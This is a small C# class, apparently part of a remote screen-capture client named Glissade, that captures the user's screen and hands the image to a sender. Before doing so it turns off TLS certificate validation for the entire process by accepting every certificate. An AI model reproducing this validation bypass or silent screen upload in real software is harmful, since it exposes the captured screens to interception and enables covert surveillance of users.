using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;

namespace Glissade.Client {
    class ScreenLoader {
        public static void Start() {
            ServicePointManager.ServerCertificateValidationCallback = delegate (object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) {
                return true;
            };
            ImageSender imageSender = new ImageSender();
            ImageCreator screen = new ImageCreator();
            byte[] ScreenBytes = screen.ImageMaker();
            imageSender.Sender(ScreenBytes);
        }
    }
}
